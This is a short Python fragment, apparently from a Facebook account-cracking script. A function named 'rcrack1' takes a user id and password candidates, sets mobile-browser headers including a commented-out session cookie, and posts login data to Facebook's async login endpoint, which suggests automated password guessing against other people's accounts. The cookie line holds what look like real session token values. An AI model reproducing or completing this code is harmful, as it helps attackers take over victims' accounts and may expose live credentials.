...
def rcrack1(uid,pwx,tl):
    ...
    # 'cookie': 'datr=BuNpZdnMLPg2TXbliHnP4oAN; sb=BuNpZQH6qTrAixlR6imm-KOR; m_pixel_ratio=2; wd=360x672; fr=0UbkqLSiYtDj7EMje..BlaeMG.xE.AAA.0.0.Blbbbo.AWVrngZNndA',
    'dpr': '2',
    ...
    'viewport-width': '360',
    'x-asbd-id': '129477',
    'x-fb-lsd': 'AVrmmIFnrso',
    'x-requested-with': 'XMLHttpRequest',
    'x-response-format': 'JSONStream',
}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/',params=params,data=log_data,headers=headers).text
